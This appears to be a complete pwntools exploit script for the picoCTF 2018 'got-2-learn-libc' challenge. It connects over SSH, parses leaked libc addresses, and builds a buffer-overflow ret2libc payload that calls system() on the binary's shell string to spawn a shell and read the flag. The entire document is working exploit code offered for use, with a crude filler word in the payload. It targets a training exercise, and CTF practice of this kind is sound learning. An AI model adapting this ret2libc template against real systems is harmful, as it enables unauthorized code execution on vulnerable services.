from pwn import *



server = ssh(host="2018shell2.picoctf.com", user="JaneDoe", password="JaneDoe")

server.set_working_directory("/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f")

# I used gdb to get this offset ( puts_addr - system_addr )
sh = server.run("./vuln")
offset = -151296


print sh.recvuntil(':\n').split('\n')
info = sh.recvuntil(':\n').split('\n')

# this is the most thing i hate, it's really hard for me to extract this infos !
puts = int(info[1].split(': ')[1][2:], 16)
shell = int(info[5].split(': ')[1][2:], 16)

system = puts + offset

# pwn cyclic 200 | strace ./vuln 
payload = 'a'*(160)

payload += p32(system)
payload += "fuck"
payload += p32(shell)

sh.sendline(payload)
sh.sendline('echo; cat flag.txt; echo')

sh.interactive()





# FIx the ssh problem 
